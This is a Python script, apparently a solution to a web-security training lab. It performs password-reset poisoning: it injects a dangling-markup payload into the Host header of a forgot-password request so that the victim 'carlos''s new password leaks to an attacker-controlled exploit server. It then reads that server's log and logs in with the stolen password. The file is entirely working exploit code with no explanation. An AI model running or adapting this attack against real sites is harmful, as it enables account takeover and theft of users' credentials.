import urllib.parse
import re
import sys
import requests
import http.client


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
reset_pass_url = burp_url + '/forgot-password'
login_url = burp_url + '/login'

session = requests.Session()

response = session.get(burp_url)
exploit_server = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text).group(0)
#mail_server = exploit_server + '/email'
logs = exploit_server + '/log'

response = session.get(reset_pass_url)
csrf = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)

burp_data = {"csrf": csrf, "username": "carlos"}

cookies = session.cookies.get_dict()
cookie_header = "; ".join([f"{name}={value}" for name, value in cookies.items()])

parsed_url = urllib.parse.urlparse(burp_url)
host = parsed_url.netloc
conn = http.client.HTTPSConnection(host)

host_header = f'{burp_url[8:]}'+f':\'<a href="//{exploit_server[8:]}/?'

headers = {"Host": host_header, "Content-Type": "application/x-www-form-urlencoded","Cookie": cookie_header }
body = urllib.parse.urlencode(burp_data)
conn.request("POST", '/forgot-password', body=body, headers=headers)
response = conn.getresponse()
data = response.read()
conn.close()

r = session.get(logs)
password = re.search(r'your\+new\+password:\+([0-9a-zA-Z]{10})', r.text).group(1)
print(password)

response = session.get(login_url)
csrf = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)
burp_data = {"csrf": csrf,"username": "carlos", "password": password}
session.post(login_url, data=burp_data)
